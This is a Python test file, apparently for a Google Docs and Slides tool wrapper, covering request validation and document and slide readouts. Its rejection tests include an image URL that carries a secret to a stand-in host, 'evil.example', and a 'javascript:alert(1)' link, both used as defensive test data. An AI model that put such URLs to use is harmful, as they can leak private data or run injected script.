        for kind in ("createImage", "replaceImage", "replaceAllShapesWithImage", "createVideo", "createSheetsChart",
                     "replaceAllShapesWithSheetsChart", "refreshSheetsChart", "insertComment", "addCommentReply",
                     "updateCommentPost", "deleteComment", "deleteCommentReply", "create_image"):
            with self.subTest(kind=kind):
                self._assert_rejected([{kind: {}}], f"{kind} は使えません")

    def test_背景画像のURLは書き方にかかわらず拒否する(self):
        for key in ("contentUrl", "content_url"):
            with self.subTest(key=key):
                background = {
                    "updatePageProperties": {
                        "objectId": "p1",
                        "pageProperties": {"pageBackgroundFill": {"stretchedPictureFill": {key: "https://evil.example/?q=秘密"}}},
                        "fields": "pageBackgroundFill",
                    }
                }
                self._assert_rejected([background], f"pageBackgroundFill.stretchedPictureFill.{key}")

    def test_入れ子の画像URLとスプレッドシートIDは種類にかかわらず拒否する(self):
        for key in ("imageUrl", "image_url", "spreadsheetId", "spreadsheet_id"):
            with self.subTest(key=key):
                self._assert_rejected([{"insertText": {"objectId": "t_12345", "text": "x", "extra": {key: "x"}}}], f"insertText.extra.{key}")

    def test_httpとhttps以外のリンクは拒否する(self):
        for url in ("javascript:alert(1)", "ftp://example.com", "", 1, "//example.com"):
            with self.subTest(url=url):
                self._assert_rejected([_slide_link({"url": url})], "style.link.url")

    def test_1件でも不正なら全体を拒否する(self):
        self._assert_rejected([{"insertText": {"objectId": "t_12345", "text": "x"}}, {"createImage": {"url": "https://example.com/a.png"}}])


class DocsSlidesReadTest(unittest.TestCase):
    def test_ドキュメントの段落と表を読む(self):
        s = FakeServices()
        s.docs_documents.get.return_value.execute.return_value = {
            "title": "議事録",
            "tabs": [
                {
                    "documentTab": {
                        "body": {
                            "content": [
                                {"paragraph": {"elements": [{"textRun": {"content": "はじめに\n"}}]}},
                                {
                                    "table": {
                                        "tableRows": [
                                            {
                                                "tableCells": [
                                                    {"content": [{"paragraph": {"elements": [{"textRun": {"content": "A\n"}}]}}]},
                                                    {"content": [{"paragraph": {"elements": [{"textRun": {"content": "B\n"}}]}}]},
                                                ]
                                            }
                                        ]
                                    }
                                },
                            ]
                        }
                    }
                }
            ],
        }
        text = call(s, "docs_read", {"document_id": FILE_ID})["content"][0]["text"]
        self.assertIn("はじめに", text)
        self.assertIn("A | B", text)

    def test_構造表示では位置と段落の種類を返す(self):
        s = FakeServices()
        s.docs_documents.get.return_value.execute.return_value = {
            "title": "議事録",
            "tabs": [
                {
                    "documentTab": {
                        "body": {
                            "content": [
                                {
                                    "startIndex": 1,
                                    "endIndex": 6,
                                    "paragraph": {
                                        "paragraphStyle": {"namedStyleType": "HEADING_2"},
                                        "elements": [{"textRun": {"content": "決定事項\n"}}],
                                    },
                                },
                                {
                                    "startIndex": 6,
                                    "endIndex": 15,
                                    "paragraph": {
                                        "paragraphStyle": {"namedStyleType": "NORMAL_TEXT"},
                                        "bullet": {"listId": "l1", "nestingLevel": 1},
                                        "elements": [{"textRun": {"content": "予算は来期に回す\n"}}],
                                    },
                                },
                                {
                                    "startIndex": 15,
                                    "endIndex": 22,
                                    "table": {
                                        "rows": 1,
                                        "columns": 1,
                                        "tableRows": [
                                            {
                                                "tableCells": [
                                                    {
                                                        "startIndex": 17,
                                                        "endIndex": 20,
                                                        "content": [
                                                            {
                                                                "startIndex": 18,
                                                                "endIndex": 20,
                                                                "paragraph": {"elements": [{"textRun": {"content": "A\n"}}]},
                                                            }
                                                        ],
                                                    }
                                                ]
                                            }
                                        ],
                                    },
                                },
                            ]
                        }
                    }
                }
            ],
        }
        text = call(s, "docs_read", {"document_id": FILE_ID, "format": "structure"})["content"][0]["text"]
        self.assertIn("[1-6) HEADING_2 決定事項\n", text)
        self.assertIn("[6-15) NORMAL_TEXT 箇条書き(階層1) 予算は来期に回す", text)
        self.assertIn("[15-22) 表 1行×1列", text)
        self.assertIn("  セル(0,0) [17-20)\n    [18-20) NORMAL_TEXT A", text)

    def test_構造表示では文字以外の要素と要素ごとの位置を返す(self):
        s = FakeServices()
        content = [
            # API は 0 の startIndex を省略して返す
            {"endIndex": 1, "sectionBreak": {}},
            {"startIndex": 1, "endIndex": 3, "tableOfContents": {"content": []}},
            {
                "startIndex": 3,
                "endIndex": 9,
                "paragraph": {
                    "elements": [
                        {"startIndex": 3, "endIndex": 5, "textRun": {"content": "図:"}},
                        {"startIndex": 5, "endIndex": 6, "inlineObjectElement": {"inlineObjectId": "i1"}},
                        {"startIndex": 6, "endIndex": 9, "textRun": {"content": "太字\n", "textStyle": {"bold": True}}},
                    ]
                },
            },
            {"startIndex": 9, "endIndex": 10, "paragraph": {"elements": [{"textRun": {"content": "\n"}}]}},
            {
                "startIndex": 10,
                "endIndex": 14,
                "paragraph": {
                    "elements": [
                        {"startIndex": 10, "endIndex": 13, "textRun": {"content": "リンク", "textStyle": {"link": {}}}},
                        {"startIndex": 13, "endIndex": 14, "textRun": {"content": "\n"}},
                    ]
                },
            },
        ]
        s.docs_documents.get.return_value.execute.return_value = {"title": "d", "tabs": [{"documentTab": {"body": {"content": content}}}]}
        text = call(s, "docs_read", {"document_id": FILE_ID, "format": "structure"})["content"][0]["text"]
        self.assertIn("[1-3) 目次", text)
        self.assertIn("[3-9) NORMAL_TEXT 図:[画像]太字\n  [3-5) 図:\n  [5-6) [画像]\n  [6-9) 太字\n", text)
        self.assertIn("[9-10) NORMAL_TEXT （空行）", text)
        self.assertIn("[10-14) NORMAL_TEXT リンク\n  [10-13) リンク\n  [13-14) （改行）\n", text)

    def test_構造表示では複数タブのタブIDを返す(self):
        s = FakeServices()

        def tab(tab_id, title):
            return {"tabProperties": {"tabId": tab_id, "title": title}, "documentTab": {"body": {"content": []}}}

        s.docs_documents.get.return_value.execute.return_value = {"title": "d", "tabs": [tab("t.0", "表紙"), tab("t.1", "本文")]}
        text = call(s, "docs_read", {"document_id": FILE_ID, "format": "structure"})["content"][0]["text"]
        self.assertIn("## タブ: 本文（tabId: t.1）", text)
        plain = call(s, "docs_read", {"document_id": FILE_ID})["content"][0]["text"]
        self.assertNotIn("tabId", plain)

    def test_スライドのテキストを読む(self):
        s = FakeServices()
        s.slides_presentations.get.return_value.execute.return_value = {
            "title": "提案",
            "slides": [
                {
                    "objectId": "p1",
                    "pageElements": [{"shape": {"text": {"textElements": [{"textRun": {"content": "表紙タイトル"}}]}}}],
                }
            ],
        }
        text = call(s, "slides_read", {"presentation_id": FILE_ID})["content"][0]["text"]
        self.assertIn("表紙タイトル", text)

    def test_スライドの構造表示ではIDと位置と大きさを返す(self):
        def emu(pt):
            return {"magnitude": pt * 12_700, "unit": "EMU"}

        s = FakeServices()
        s.slides_presentations.get.return_value.execute.return_value = {
            "title": "提案",
            "pageSize": {"width": emu(720), "height": emu(405)},
            "layouts": [{"objectId": "l_2", "layoutProperties": {"name": "TITLE_AND_BODY", "displayName": "タイトルと本文"}}],
            "slides": [
                {
                    "objectId": "p1",
                    "slideProperties": {
                        "layoutObjectId": "l_2",
                        "notesPage": {
                            "notesProperties": {"speakerNotesObjectId": "n1"},
                            "pageElements": [{"objectId": "n1", "shape": {"shapeType": "TEXT_BOX"}}],
                        },
                    },
                    "pageElements": [
                        {
                            "objectId": "t1",
                            "size": {"width": emu(300), "height": emu(50)},
                            "transform": {"scaleX": 2, "scaleY": 1, "translateX": 40 * 12_700, "translateY": 30 * 12_700, "unit": "EMU"},
                            "shape": {
                                "shapeType": "TEXT_BOX",
                                "placeholder": {"type": "TITLE"},
                                "text": {
                                    "textElements": [
                                        {"endIndex": 7, "paragraphMarker": {}},
                                        {"endIndex": 3, "textRun": {"content": "四半期"}},
                                        {"startIndex": 3, "endIndex": 7, "textRun": {"content": "の振り返\n"}},
                                        {"startIndex": 7, "endIndex": 10, "paragraphMarker": {"bullet": {"nestingLevel": 1}}},
                                        {"startIndex": 7, "endIndex": 10, "textRun": {"content": "売上\n"}},
                                    ]
                                },
                            },
                        },
                        {
                            "objectId": "tb1",
                            "table": {
                                "rows": 1,
                                "columns": 1,
                                "tableRows": [{"tableCells": [{"text": {"textElements": [
                                    {"endIndex": 3, "paragraphMarker": {}},
                                    {"endIndex": 3, "textRun": {"content": "項目\n"}},
                                ]}}]}],
                            },
                        },
                        {"objectId": "img1", "image": {}, "transform": {"scaleX": 1, "scaleY": 1, "translateX": 10, "unit": "PT"}},
                        {
                            "objectId": "g1",
                            "elementGroup": {"children": [{"objectId": "c1", "line": {}, "transform": {"translateY": 5, "unit": "PT"}}]},
                        },
                    ],
                }
            ],
        }
        text = call(s, "slides_read", {"presentation_id": FILE_ID, "format": "structure"})["content"][0]["text"]
        for expected in (
            "## スライド 1（objectId: p1, レイアウト: TITLE_AND_BODY）",
            "図形 t1 TEXT_BOX 位置(40,30pt) 大きさ(600×50pt) プレースホルダー: TITLE",
            "  [0-7) 四半期の振り返",
            "    [0-3) 四半期",
            "    [3-7) の振り返",
            "  [7-10) 箇条書き(階層1) 売上",
            "表 tb1 1行×1列 位置(0,0pt)",
            "    [0-3) 項目",
            "画像 img1 位置(10,0pt)",
            "グループ g1 位置(0,0pt)",
            "  線 c1 グループ基準の位置(0,5pt)",
            "（スピーカーノート objectId: n1）",
            "l_2 TITLE_AND_BODY「タイトルと本文」",
            "ページの大きさ 720×405pt",
        ):
            self.assertIn(expected, text)
        # 段落が 1 つの範囲だけなら、範囲ごとの行は出さない
        self.assertNotIn("    [7-10) 売上", text)
        plain = call(s, "slides_read", {"presentation_id": FILE_ID})["content"][0]["text"]
        self.assertNotIn("objectId: t1", plain)
        self.assertIn("四半期の振り返", plain)


if __name__ == "__main__":
    unittest.main()
